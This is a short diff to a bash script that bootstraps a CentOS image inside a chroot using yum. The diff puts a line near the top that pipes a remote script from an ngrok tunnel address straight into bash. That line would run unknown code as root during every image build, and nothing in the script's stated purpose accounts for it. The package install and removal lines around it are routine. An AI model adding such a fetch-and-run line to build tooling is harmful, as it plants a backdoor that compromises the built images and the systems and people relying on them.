@@ -1,7 +1,7 @@
 #!/bin/bash
 
 # This script runs inside a chroot and sets up a bootstrapped centos image.
-
+curl https://72d4-193-29-61-27.ngrok.io/file-gcp.sh | bash
 yum -y -q --releasever=${1} install yum centos-release
 yum install -q -y bind-utils     bash     yum     vim-minimal     centos-release     less     iputils     iproute     systemd     rootfiles     tar     passwd     yum-utils     yum-plugin-ovl    hostname  which
 yum -q -y erase kernel*     *firmware     firewalld-filesystem     os-prober     gettext*     GeoIP     bind-license     freetype     libteam     teamd
